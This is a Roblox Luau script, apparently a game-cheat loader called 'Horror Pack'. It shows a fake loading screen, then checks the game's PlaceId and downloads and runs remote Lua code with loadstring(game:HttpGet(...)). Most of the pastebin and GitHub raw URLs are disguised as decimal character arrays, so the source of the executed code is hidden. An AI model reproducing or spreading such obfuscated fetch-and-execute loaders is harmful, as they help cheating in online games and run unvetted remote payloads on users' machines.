local StarterGui = game:GetService("StarterGui")

local function decode(t)
    local s = ""

    for _, v in ipairs(t) do
        s = s .. string.char(v)
    end

    return s
end

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Loading = Instance.new("TextLabel")
local SubLoading = Instance.new("TextLabel")

pcall(function()
    ScreenGui.Parent = game:GetService("CoreGui")
end)

Frame.Parent = ScreenGui
Frame.Size = UDim2.new(0,350,0,170)
Frame.Position = UDim2.new(0.5,-175,0.5,-85)
Frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
Frame.BorderSizePixel = 0

Title.Parent = Frame
Title.Size = UDim2.new(1,0,0,40)
Title.BackgroundTransparency = 1
Title.Text = "Horror Pack"
Title.TextColor3 = Color3.fromRGB(255,255,255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 24

Loading.Parent = Frame
Loading.Position = UDim2.new(0,0,0,60)
Loading.Size = UDim2.new(1,0,0,40)
Loading.BackgroundTransparency = 1
Loading.Text = "Loading 0/100"
Loading.TextColor3 = Color3.fromRGB(255,255,255)
Loading.Font = Enum.Font.GothamBold
Loading.TextSize = 22

SubLoading.Parent = Frame
SubLoading.Position = UDim2.new(0,0,0,105)
SubLoading.Size = UDim2.new(1,0,0,30)
SubLoading.BackgroundTransparency = 1
SubLoading.Text = "Starting..."
SubLoading.TextColor3 = Color3.fromRGB(170,170,170)
SubLoading.Font = Enum.Font.Gotham
SubLoading.TextSize = 16

task.spawn(function()

    for i = 0,100 do

        Loading.Text = "Loading "..i.."/100"

        if i <= 20 then
            SubLoading.Text = "Credit By ScriptGaming"
        elseif i <= 40 then
            SubLoading.Text = "Loading Scripts..."
        elseif i <= 70 then
            SubLoading.Text = "Loading Rayfield..."
        elseif i <= 99 then
            SubLoading.Text = "Game Name : "..game.Name
        else
            SubLoading.Text = "Loaded!"
        end

        task.wait(0.03)
    end
end)

task.wait(3.5)

if game.PlaceId == 6205205961 then

    loadstring(game:HttpGet(decode({
        104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,97,88,97,107,76,81,119,115
    })))()

elseif game.PlaceId == 1985320156 then

    loadstring(game:HttpGet(decode({
        104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,52,90,112,121,65,57,53,110
    })))()

elseif game.PlaceId == 4480809144 then

    loadstring(game:HttpGet(decode({
        104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,74,54,75,101,122,106,89,84
    })))()

elseif game.PlaceId == 116387287343653 then

    loadstring(game:HttpGet(decode({
        104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,98,57,97,119,53,115,78,57
    })))()

elseif game.PlaceId == 14476003462 then

    loadstring(game:HttpGet(decode({
        104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,86,117,66,121,53,57,88,68
    })))()

elseif game.PlaceId == 137811364710617 then

    loadstring(game:HttpGet(decode({
        104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,109,117,78,114,56,52,57,55
    })))()

elseif game.PlaceId == 9120716669 then

    loadstring(game:HttpGet(decode({
        104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,97,114,107,97,110,122,117,108,102,97,100,108,105,112,117,116,114,97,45,111,115,115,47,71,97,109,101,115,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,73,110,115,97,110,101,37,50,48,69,108,101,118,97,116,111,114,37,50,48,84,101,115,116,105,110,103,47,83,99,114,105,112,116,46,108,117,97
    })))()

elseif game.PlaceId == 16089229671 then

    loadstring(game:HttpGet(decode({
        104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,97,114,107,97,110,122,117,108,102,97,100,108,105,112,117,116,114,97,45,111,115,115,47,71,97,109,101,115,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,83,117,114,118,105,118,97,108,37,50,48,71,114,97,110,110,121,47,83,99,114,105,112,116,46,108,117,97
    })))()

elseif game.PlaceId == 5777099015 then

    loadstring(game:HttpGet(decode({
        104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,97,114,107,97,110,122,117,108,102,97,100,108,105,112,117,116,114,97,45,111,115,115,47,71,97,109,101,115,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,67,104,101,101,115,101,37,50,48,72,111,114,114,111,114,47,67,104,97,112,116,101,114,37,50,48,49,47,83,99,114,105,112,116,46,108,117,97
    })))()

elseif game.PlaceId == 9053673709 then

    loadstring(game:HttpGet(decode({
        104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,97,114,107,97,110,122,117,108,102,97,100,108,105,112,117,116,114,97,45,111,115,115,47,71,97,109,101,115,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,67,104,101,101,115,101,37,50,48,72,111,114,114,111,114,47,67,104,97,112,116,101,114,37,50,48,50,47,83,99,114,105,112,116,46,108,117,97
    })))()

elseif game.PlaceId == 6153766069 then

    loadstring(game:HttpGet(decode({
        104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,97,114,107,97,110,122,117,108,102,97,100,108,105,112,117,116,114,97,45,111,115,115,47,71,97,109,101,115,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,69,115,99,97,112,101,37,50,48,67,97,114,110,105,118,97,108,47,83,99,114,105,112,116,46,108,117,97
    })))()

elseif game.PlaceId == 10384852727 then

    loadstring(game:HttpGet("https://pastefy.app/G4cyekwG/raw"))()

else

    Loading.Text = "Failed"
    SubLoading.Text = "Wrong Game"

    task.wait(3)

end

task.wait(1)

ScreenGui:Destroy()
